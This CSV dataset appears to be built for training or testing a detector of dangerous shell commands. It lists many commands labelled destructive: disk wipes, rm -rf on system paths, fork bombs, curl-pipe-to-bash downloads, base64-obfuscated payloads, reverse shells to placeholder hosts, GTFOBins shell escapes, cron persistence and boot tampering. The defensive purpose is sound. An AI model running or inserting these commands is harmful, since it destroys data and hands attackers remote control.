command,label,source
dd if=/dev/zero of=/dev/sda bs=1M && reboot -f,destructive,synthetic
shutdown -h now &,destructive,mitre-attack
dd if=/dev/zero of=/dev/xvda,destructive,synthetic
wget -O - http://203.0.113.30/script.sh | sh,destructive,synthetic
curl http://evil.example/x.sh | bash -s --,destructive,synthetic
bash <(curl -s http://example.com/x.sh),destructive,synthetic
sh <(wget -qO- http://example.com/x.sh),destructive,synthetic
curl -sSL http://example.com/miner.sh | bash,destructive,synthetic
wget http://example.com/dropper.sh -O- | bash,destructive,synthetic
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,destructive,gtfobins
find . -exec /bin/sh \; -quit,destructive,gtfobins
"python3 -c ""import os; os.system('/bin/sh')""",destructive,gtfobins
tar czf archive.tar.gz --use-compress-program=/bin/sh,destructive,gtfobins
dd if=/dev/zero of=/dev/sda2,destructive,synthetic
"vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",destructive,gtfobins
"find / -name ""*.conf"" -exec /bin/sh -p \; -quit",destructive,gtfobins
less /etc/passwd -e '!/bin/sh',destructive,gtfobins
nmap --interactive,destructive,gtfobins
"python3 -c ""import pty; pty.spawn('/bin/sh')""",destructive,gtfobins
env /bin/sh,destructive,gtfobins
tar -xf archive.tar --to-command=/bin/sh,destructive,gtfobins
rm -rf / --no-preserve-root,destructive,synthetic
nc -e /bin/sh 203.0.113.50 4444,destructive,synthetic
bash -i >& /dev/tcp/203.0.113.50/4444 0>&1,destructive,synthetic
"python3 -c ""import socket,subprocess,os;s=socket.socket();s.connect(('203.0.113.50',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])""",destructive,synthetic
mkfifo /tmp/f; nc 203.0.113.50 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1,destructive,synthetic
ncat 203.0.113.50 4444 -e /bin/bash,destructive,synthetic
"awk 'BEGIN {system(""id"")}'",destructive,gtfobins
grub-install --recheck --removable,destructive,mitre-attack
dd if=/dev/zero of=/dev/vda,destructive,synthetic
dd if=/dev/sda of=/dev/null bs=1M count=1,destructive,mitre-attack
dd if=/dev/zero of=/dev/sda bs=4M,destructive,mitre-attack
"(crontab -l; echo ""* * * * * curl http://example.com/check.sh | bash"") | crontab -",destructive,synthetic
mkfs.btrfs /dev/nvme0n1,destructive,synthetic
dd if=/dev/zero of=/dev/sda,destructive,synthetic
dd if=/dev/zero of=/dev/nvme0n1,destructive,synthetic
mkfs.btrfs /dev/sda,destructive,synthetic
dd if=/dev/random of=/dev/sda bs=512 count=1,destructive,synthetic
dd if=/dev/zero of=/dev/sda bs=1M count=1000,destructive,synthetic
dd if=/dev/zero of=/dev/sdc conv=notrunc,destructive,synthetic
dd if=/dev/zero of=/dev/mapper/vg0-root,destructive,synthetic
dd if=/dev/random of=/dev/mmcblk0 bs=64K,destructive,synthetic
dd if=/dev/urandom of=/dev/sda1,destructive,synthetic
printf '#!/bin/sh\nrm -rf /\n' > /tmp/x && chmod +x /tmp/x && /tmp/x,destructive,mitre-attack
dd if=/dev/zero of=/dev/hda,destructive,synthetic
dd if=/dev/random of=/dev/sda bs=4M,destructive,synthetic
rm -rf *,destructive,mitre-attack
sudo dd if=image.iso of=/dev/sda bs=4M,destructive,mitre-attack
chmod -R 777 /,destructive,mitre-attack
yes | head -c 1000000000 > /dev/null,destructive,mitre-attack
dpkg --force-remove-reinstreq -r base-files,destructive,mitre-attack
dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive,synthetic
dd if=/dev/urandom of=/dev/sda,destructive,mitre-attack
dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive,synthetic
chmod 777 /etc/passwd,destructive,mitre-attack
parted -s /dev/sda mklabel msdos,destructive,mitre-attack
dd if=/dev/zero of=/dev/sda bs=1M,destructive,synthetic
dd if=/dev/zero of=/dev/sda bs=4096 count=100000,destructive,synthetic
rm -rf ./*,destructive,mitre-attack
"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:203.0.113.50:4444",destructive,synthetic
rm -rf / && history -c,destructive,synthetic
curl -s http://203.0.113.15/x | base64 -d > /tmp/x.sh && bash /tmp/x.sh,destructive,synthetic
rm /etc/passwd,destructive,mitre-attack
dd if=/dev/zero of=/dev/sda bs=512,destructive,synthetic
echo 0 > /proc/sys/kernel/randomize_va_space && echo 0 > /proc/sys/kernel/kptr_restrict,destructive,mitre-attack
doas rm -rf /,destructive,mitre-attack
sudo rm -rf /boot/grub,destructive,mitre-attack
mkfs.ext3 /dev/mmcblk0,destructive,synthetic
mkfs.ext4 /dev/sdb1,destructive,synthetic
parted /dev/sda rm 1,destructive,mitre-attack
efibootmgr --create --disk /dev/sda --part 1 --label Bad --loader \EFI\bad.efi,destructive,mitre-attack
dd if=/dev/urandom of=/dev/sdb bs=512,destructive,synthetic
rm -rf .,destructive,mitre-attack
cat payload.b64 | base64 -d | bash,destructive,synthetic
dd if=/dev/urandom of=/dev/mmcblk0 bs=64K,destructive,synthetic
sudo chmod 777 /usr,destructive,mitre-attack
sudo rm -rf --no-preserve-root /,destructive,mitre-attack
mkfs.ext3 /dev/sda,destructive,synthetic
wipefs -af /dev/nvme0n1,destructive,mitre-attack
mkfs -t ext4 /dev/sdb,destructive,mitre-attack
bomb() { bomb | bomb & }; bomb,destructive,mitre-attack
sudo rm -rf /,destructive,mitre-attack
pkexec rm -rf /,destructive,mitre-attack
dd if=/dev/random of=/dev/sdb bs=1M,destructive,synthetic
cp /dev/zero /dev/sda,destructive,mitre-attack
shred -vfz /dev/mmcblk0,destructive,synthetic
rm -rf --no-preserve-root /,destructive,mitre-attack
rm -rf /dev/sda,destructive,mitre-attack
"php -r '$sock=fsockopen(""203.0.113.50"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",destructive,synthetic
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvNDQ0NCAwPiYx | base64 -d | bash,destructive,synthetic
"printf '%s' ""Y3VybCBldmlsLmNvbS9zaGVsbC5zaCB8IHNo"" | base64 -d | sh",destructive,synthetic
curl -s http://203.0.113.99/wipe.sh | bash,destructive,synthetic
curl -fsSL http://198.51.100.20/run.sh | sudo bash,destructive,synthetic
wget -qO- http://example.com/init.sh | bash,destructive,synthetic
curl -s http://example.com/install.sh | bash,destructive,synthetic
"python3 -c ""while True: __import__('os').fork()""",destructive,synthetic
dd if=/dev/urandom of=/dev/sda bs=1M count=500,destructive,synthetic
mkfs.btrfs /dev/sdb1,destructive,mitre-attack
mkfs.ntfs /dev/sdb,destructive,synthetic
mkfs -t ext4 /dev/sda1,destructive,synthetic
mkfs.vfat /dev/mmcblk0p1,destructive,mitre-attack
mkfs.btrfs /dev/sda1,destructive,synthetic
mkfs.ext3 /dev/vda,destructive,synthetic
curl http://198.51.100.9/stage2.b64 -s | base64 -D | bash,destructive,synthetic
mkfs.ext4 -F /dev/sda1,destructive,synthetic
.(){ .|.& };.,destructive,synthetic
perl -e 'fork while fork',destructive,synthetic
:(){ : & : & };:,destructive,synthetic
"echo ""cm0gLXJmIC8="" | base64 -d | sh",destructive,synthetic
while true; do $0 & done,destructive,synthetic
:(){ :&:&};:,destructive,synthetic
rm -f /bin/sh && ln -s /tmp/evil /bin/sh,destructive,mitre-attack
ruby -e 'loop { fork }',destructive,synthetic
echo Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCB8IGJhc2g= | base64 -d | bash,destructive,synthetic
curl -s http://example.com/payload.b64 | base64 -d | sh,destructive,synthetic
"echo ""d2dldCBodHRwOi8vZXZpbC5jb20vbWFsIC1PIC90bXAvbQ=="" | base64 --decode | bash",destructive,synthetic
wget -qO- http://example.com/enc.txt | base64 -d | bash,destructive,synthetic
bomb(){ bomb|bomb& };bomb,destructive,synthetic
echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger,destructive,mitre-attack
mkfs.btrfs /dev/sda3,destructive,synthetic
find / -delete,destructive,mitre-attack
mkfs.ext3 /dev/sda3,destructive,synthetic
shred -n 3 /dev/nvme0n1,destructive,synthetic
:(){ :|:& };:,destructive,mitre-attack
shred -u /dev/mmcblk0,destructive,synthetic
grub-mkdevicemap --device-map=/dev/null,destructive,mitre-attack
shred -n 7 -z /dev/mmcblk0,destructive,synthetic
parted /dev/sda mklabel gpt,destructive,mitre-attack
mkfs.vfat /dev/sdb1,destructive,synthetic
dd if=/dev/urandom of=/dev/sdc bs=512,destructive,synthetic
shred -n 7 -z /dev/nvme0n1,destructive,synthetic
mkfs.xfs /dev/sdb1,destructive,synthetic
mkfs.xfs /dev/nvme0n1,destructive,synthetic
rm -rf /usr,destructive,synthetic
dd if=/dev/urandom of=/dev/mmcblk0 bs=1M,destructive,synthetic
dd if=/dev/zero of=/dev/mmcblk0 bs=4M,destructive,synthetic
rm -rf /etc,destructive,synthetic
rm -rf /sbin,destructive,mitre-attack
rm -rf /boot,destructive,synthetic
mkfs.ext4 /dev/sda,destructive,synthetic
mkfs.ext3 /dev/nvme0n1,destructive,synthetic
rm -rf /home,destructive,synthetic
rm -rf /,destructive,synthetic
dd if=/dev/random of=/dev/nvme0n1 bs=512,destructive,synthetic
fdisk /dev/sda && mkfs.ext4 /dev/sda1,destructive,mitre-attack
rm -rf /etc/ssh,destructive,mitre-attack
efibootmgr --delete-bootnum --bootnum 0000,destructive,mitre-attack
shred -vfz /dev/nvme0n1,destructive,synthetic
:(){ :|:& };: &,destructive,mitre-attack
mkfs.vfat /dev/mmcblk0,destructive,synthetic
shred -vfz /dev/sdb,destructive,synthetic
dd if=/dev/random of=/dev/sdc bs=512,destructive,synthetic
shred -u /dev/sdb,destructive,synthetic
dd if=/dev/zero of=/dev/sdc bs=64K,destructive,synthetic
mkfs.btrfs /dev/mmcblk0,destructive,synthetic
wipefs -a /dev/sdb,destructive,synthetic
sudo wipefs,destructive,synthetic
rm -rf /dev,destructive,synthetic
rm -rf /var/lib/dpkg,destructive,mitre-attack
sudo dd,destructive,synthetic
wipefs -a /dev/nvme0n1,destructive,synthetic
sudo shred,destructive,synthetic
rm -rf /*,destructive,synthetic
dd if=/dev/zero of=/dev/sdc bs=1M,destructive,synthetic
rm -rf /bin,destructive,synthetic
sudo rm,destructive,synthetic
mkfs.xfs /dev/mmcblk0,destructive,synthetic
rm -rf ~,destructive,synthetic
dd if=/dev/urandom of=/dev/sdc bs=64K,destructive,synthetic
mkfs.xfs /dev/sda,destructive,synthetic
dd if=/dev/zero of=/dev/sdb bs=1M,destructive,synthetic
shred -u /dev/nvme0n1,destructive,synthetic
shred -u /dev/sda,destructive,synthetic
sudo rm -fr /home,destructive,mitre-attack
